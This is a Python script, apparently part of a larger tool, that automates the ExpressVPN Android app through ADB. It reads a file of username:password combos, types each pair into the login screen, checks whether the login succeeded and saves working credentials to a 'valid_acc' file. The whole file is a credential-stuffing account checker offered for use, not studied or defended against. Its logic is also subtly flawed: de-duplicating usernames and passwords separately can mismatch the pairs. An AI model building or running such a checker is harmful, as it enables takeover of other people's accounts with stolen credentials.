#!/usr/bin/python3
#expressvpn

import modules.header as header
import os
import modules.keyevents as keyevents
import modules.settings	as settings
import time

from modules.settings import directories as path

def Checker():

		print("\x1bc"); header.Checking()
		ctr=0 

		users=[] 
		passwords=[] 

		app='com.expressvpn.vpn'

		with open (path()+'express','r') as accounts:

			for lines in accounts:
	
				users.append(lines.split(":")[0])
		
				passwords.append(lines.split(":")[1])
			
		accounts.close()

		users=list(dict.fromkeys(users))
		passwords=list(dict.fromkeys(passwords))

		

		while ctr < len(users):
			
			keyevents.Power(); keyevents.Menu(); keyevents.StartApp(app);time.sleep(1)

			if ctr == len(users)+1:
				print("A total of "+str(len(users)-ctr)+" combo is being attempted\n")
	
			keyevents.Tap(594,1617)

			settings.device.shell('input text "'+(str(users[ctr]))+'"')
			keyevents.Tab(1)
		
			settings.device.shell('input text "'+(str(passwords[ctr]))+'"')
			keyevents.Tap(510,940)
	
			os.system("clear");header.title()
			header.Checking()
			header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
			time.sleep(4)
	
			while True:
		
				if "HelpDiagnosticsActivity" in str(keyevents.GetActivity('mFocusedApp')):
					header.Valid()
					header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])

					with open ('/home/user/accounts/valid_acc','a') as final:

						final.write(str(users[ctr])+":"+str(passwords[ctr]))
						final.close()
						keyevents.StopApp(app)
						keyevents.ClearData(app)
						break
				else:
					header.Invalid()
					header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
					break

			keyevents.StopApp(app)
			keyevents.Power()
			ctr +=1
		return


